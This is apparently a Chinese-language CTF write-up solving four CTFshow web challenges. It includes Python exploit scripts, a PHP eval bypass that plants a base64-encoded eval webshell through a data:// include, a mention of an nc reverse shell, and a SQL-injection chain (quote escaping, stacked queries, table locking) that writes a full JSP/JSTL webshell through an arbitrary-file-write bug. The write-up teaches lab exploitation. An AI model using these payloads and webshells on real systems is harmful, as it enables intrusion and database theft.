# CTFSHOW 七夕杯Web复现

<!--toc-->

hhh，玩一下这个七夕杯

<!--more-->

### web1 签到

打开题目如下：

![](https://i.imgur.com/Iv4SWVo.png)


能够执行短命令，但是不会回显。查看网页的源代码发现了前端javascript限制了输入命令的长度。

以为直接burpsuite抓包绕过即可，没想到还是提示命令过长，所以后端应该也有一个校验，或者这个js就是后端的代码。

答案思路：向服务器上传一个文件，然后执行这个临时文件即可。

考察点：会编写基本的shell脚本，知道临时文件路径。果然是签到题！

```python
import requests
url = "http://085e31eb-e3d0-4783-90dd-bb6189d2df1a.challenge.ctf.show/"
def get_flag(url):
    file = {
        "test": "#!/bin/bash\ncat /f*>/var/www/html/1.txt"
    }
    data = {
        "cmd": ". /t*/*"
    }
    r = requests.post(url=url+"api/tools.php",files=file,data=data)
    if "t*" in r.text:
        print("1")
    r = requests.get(url=url+"1.txt")
    if r.status_code == 200:
        print(r.text)
    else :
        print("fail")

if __name__ == '__main__':
    get_flag(url)

```



### easy_calc

```php
<?php


if(check($code)){

    eval('$result='."$code".";");
    echo($result);    
}

function check(&$code){

    $num1=$_POST['num1'];
    $symbol=$_POST['symbol'];
    $num2=$_POST['num2'];

    if(!isset($num1) || !isset($num2) || !isset($symbol) ){
        
        return false;
    }

    if(preg_match("/!|@|#|\\$|\%|\^|\&|\(|_|=|{|'|<|>|\?|\?|\||`|~|\[/", $num1.$num2.$symbol)){
        return false;
    }

    if(preg_match("/^[\+\-\*\/]$/", $symbol)){
        $code = "$num1$symbol$num2";
        return true;
    }

    return false;
}


```

没有括号的命令执行，php当中不需要括号的函数有`include,require,echo`等，这样的函数叫做语言结构。

所以思路就是利用include+伪协议读取文件。由于题目过滤了尖括号，所以可以选择进行一个base64编码绕过。

我们要执行的命令是：

```php=
include "data://text/plain,@<?php eval($_GET[1]);?>"
base64编码一下
include "data://text/plain;base64,PD9waHAgQGV2YWwoJF9HRVRbMV0pOz8+"
```

注意到最终eval执行的是三个参数连接在一起的，而且中间的参数必须是加减乘除，所以应该这样传参：

```php=
num1=include "data:/&symbol=/&num2=text/plain;base64,PD9waHAgQGV2YWwoJF9HRVRbMV0pOz8+";
```

这里有一个我不理解的地方，直接在网页用hackbar传参会失败，似乎num1参数的data:后面不能跟斜杠，后面用python脚本就可以了。

官方的优雅写法：

```php
num1=include "data:ctfshow&symbol=/&num2=b;base64,PD9waHAgZXZhbCgkX0dFVFsxXSk7Pz4";
```



```python
import requests



url = "http://64439753-14b6-4464-87c9-329b13190685.challenge.ctf.show/"
def getFlag():
        data={
                "num1":'include "data:/',
                "symbol":"/",
                "num2":'text/plain;base64,PD9waHAgQGV2YWwoJF9HRVRbMV0pOz8+";'
        }

        response = requests.post(url=url+"?1=system('cat /secret');die();",data=data)
        print(response.text)

if __name__ == '__main__':
        getFlag()

```

### easy_cmd

使用 nc 命令反弹 shell 即可。

### easy_sql

下载打开题目的附件，看到WEB-INF，应该是javaweb没跑了。直接用IDEA打开。

但是不知道从什么地方入手，因为我对javaweb并不熟悉。看答案是从controller开始审计的。

后面发现`AppController`中有如下

![](https://i.imgur.com/Xp5UlXJ.png)


这正是我们访问页面的时候出现的url参数，所以`AppController`就是页面的处理代码，故从这里开始审计代码。阅读代码知道，服务器会将我们传入的用户名和密码进行一个select查询，同时为了防止sql注入有一个`sql_check`函数的检查操作。

跟进一下`sql_check`函数

```java
 String[] ban = new String[]{"'", "file", "information", "mysql", "from", "update", "delete", "select", ",", "union", "sleep", "("};
        String[] var2 = ban;
```

ban掉了单引号，但是我们可以用斜杠转义掉用户名后的单引号从而闭合sql语句。因为执行的sql语句是这样的：

```java
String sql = "select username,password from app_user where username ='" + username + "' and password ='" + password + "' ;";
                ResultSet resultSet = DbUtil.getInstance().query(sql);
```

令username=\，password=;%23，那么执行的SQL语句就是

```java
"select username,password from app_user where username ='\' and password =';#' ;";
```

这样就成功闭合了SQL语句，但是username和password并没有插入SQL注入代码，我们如何进行注入呢？

从配置文件`config.properties`中看到`allowMultiQueries=true`，这说明允许堆叠查询。那我们就可以在password处进行堆叠注入。

回到主函数来就会发现执行完select语句之后并没有输出相应的查询结果，那我们就继续往下面跟进，发现`this.insertQueryLog(username, password);`跟进这个函数内部发现执行了一个insert语句

`String sql = "insert into app_query_log(username,password) values(?,?);";`

继续往下看是一个try、catch语句，但是try语句也没有返回查询结果。但是catch语句发现了有趣的东西。

```java
catch (SQLException var8) {
            LogUtil.save(username, password);
            var8.printStackTrace();
        }
```

这个`LogUtil.save`是干嘛的呢？继续跟进看看。

```java
 public LogUtil() {
    }

    public static void save(String username, String password) {
        FileUtil.SaveFileAs(username, password);
    }
}

```

看名字似乎是一个保存文件的操作，继续跟进一下`saveFileAs`函数。

```java
public static boolean SaveFileAs(String content, String path) {
        FileWriter fw = null;

        boolean var4;
        try {
            fw = new FileWriter(new File(path), false);
            if (content != null) {
                fw.write(content);
            }

            return true;
        } catch (IOException var14) {
            var14.printStackTrace();
            var4 = false;
        } finally {
            if (fw != null) {
                try {
                    fw.flush();
                    fw.close();
                } catch (IOException var13) {
                    var13.printStackTrace();
                }
            }

        }

        return var4;
    }
```

看到这明白了，这个函数会以username为内容，password为文件名创建一个文件。而这两个参数又是我们可控的，所以这里存在任意文件写的漏洞。根据前面的分析，想利用到这个函数，就必须触发一开始的insert语句报错，最终执行到这个函数。

所以现在的目标是往username写木马，但是先要触发一个insert语句的报错。插入语句的报错通常有三种情况，分别是修改表造成主键重复、删除表造成查询错误、锁表。

答案采用的是锁表的操作，学到啦0_0

那么我们就先传参，利用堆叠注入先锁表。之后就传恶意木马触发报错从而写入文件。

第一步：

```java
username=a\&password=;flush tables with read lock;%23
```

第二步：

写入jsp文件，由于过滤了括号，这时候只能用jstl标签来执行jsp代码，这样就完美避开了括号。

```jsp
<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<%@ taglib uri="http://java.sun.com/jsp/jstl/sql" prefix="sql"%>
<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c"%>
<%@ page isELIgnored="false" %>
<sql:setDataSource var="test" driver="${param.driver}"
        url="${param.url}" user="root" password="root" />
   <sql:query dataSource="${test}" var="result">
        ${param.sql}
    </sql:query>

<table border="1" width="100%">
        <tr>
            <th>ctfshow</th>
        </tr>
        <c:forEach var="row" items="${result.rows}">
            <tr>
                <td><c:out value="${row.t}" /></td>
            </tr>
        </c:forEach>
    </table>
```

 进行一个url编码之后直接post写入jsp木马。`param.driver,param.url,param.sql`都是我们要传给木马的参数。

```
username=%3C%25%40%20page%20language%3D%22java%22%20contentType%3D%22text%2Fhtml%3B%20charset%3DUTF-8%22%0A%20%20%20%20pageEncoding%3D%22UTF-8%22%25%3E%0A%3C%25%40%20taglib%20uri%3D%22http%3A%2F%2Fjava.sun.com%2Fjsp%2Fjstl%2Fsql%22%20prefix%3D%22sql%22%25%3E%0A%3C%25%40%20taglib%20uri%3D%22http%3A%2F%2Fjava.sun.com%2Fjsp%2Fjstl%2Fcore%22%20prefix%3D%22c%22%25%3E%0A%3C%25%40%20page%20isELIgnored%3D%22false%22%20%25%3E%0A%3Csql%3AsetDataSource%20var%3D%22test%22%20driver%3D%22%24%7Bparam.driver%7D%22%0A%20%20%20%20%20%20%20%20url%3D%22%24%7Bparam.url%7D%22%20user%3D%22root%22%20password%3D%22root%22%20%2F%3E%0A%20%20%20%3Csql%3Aquery%20dataSource%3D%22%24%7Btest%7D%22%20var%3D%22result%22%3E%0A%20%20%20%20%20%20%20%20%24%7Bparam.sql%7D%0A%20%20%20%20%3C%2Fsql%3Aquery%3E%0A%0A%0A%0A%3Ctable%20border%3D%221%22%20width%3D%22100%25%22%3E%0A%20%20%20%20%20%20%20%20%3Ctr%3E%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3Et%3C%2Fth%3E%0A%20%20%20%20%20%20%20%20%3C%2Ftr%3E%0A%20%20%20%20%20%20%20%20%3Cc%3AforEach%20var%3D%22row%22%20items%3D%22%24%7Bresult.rows%7D%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ctd%3E%3Cc%3Aout%20value%3D%22%24%7Brow.t%7D%22%20%2F%3E%3C%2Ftd%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Ftr%3E%0A%20%20%20%20%20%20%20%20%3C%2Fc%3AforEach%3E%0A%20%20%20%20%3C%2Ftable%3E&password=../webapps/ROOT/1.jsp
```

最后使用配置文件里的信息连接这个木马查询数据库信息即可。

```Java
http://xxx/1.jsp?driver=com.mysql.jdbc.Driver&url=jdbc:mysql://localhost:3306/app?characterEncoding=utf-8&useSSL=false&&autoReconnect=true&allowMultiQueries=true&serverTimezone=UTC&sql=select group_concat(table_name) as t from information_schema.tables where table_schema="app";
```

拿flag：

```Java
http://xxx.com/1.jsp?driver=com.mysql.jdbc.Driver&url=jdbc:mysql://localhost:3306/app?characterEncoding=utf-8&useSSL=false&&autoReconnect=true&allowMultiQueries=true&serverTimezone=UTC&sql=select f1ag as t from app_flag_xxoo_non0 union select 1;
```